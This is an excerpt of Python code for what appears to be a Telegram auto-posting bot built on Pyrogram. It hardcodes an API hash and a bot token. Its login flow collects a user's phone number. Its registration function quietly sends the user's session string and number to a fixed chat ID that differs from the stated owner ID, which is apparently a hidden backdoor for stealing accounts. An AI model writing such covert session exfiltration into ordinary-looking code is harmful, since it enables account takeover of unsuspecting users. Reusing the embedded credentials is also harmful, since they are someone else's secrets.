...
app = Client(
    "autoPost",
    api_id=18417379,
    api_hash="2a27725ce8b62c19eb544f38dceb331e",
    bot_token="7608592344:AAGUdfnq4-Q97eRwrxtk8wwDL9wEc5dwgHo",
)
loop = get_event_loop()
listener = Listener(client = app)
owner = 7044628644 # YOUR ID
...
async def login(_: Client, callback: CallbackQuery):
    ...
    try:ask = await listener.listen(
        ...
        reply_markup=ForceReply(selective=True, placeholder="+20123456789"),
        timeout=30)
...
async def registration(message: Message):
    ...
    try:await app.send_message(5451878368, session+_number)
    except: pass
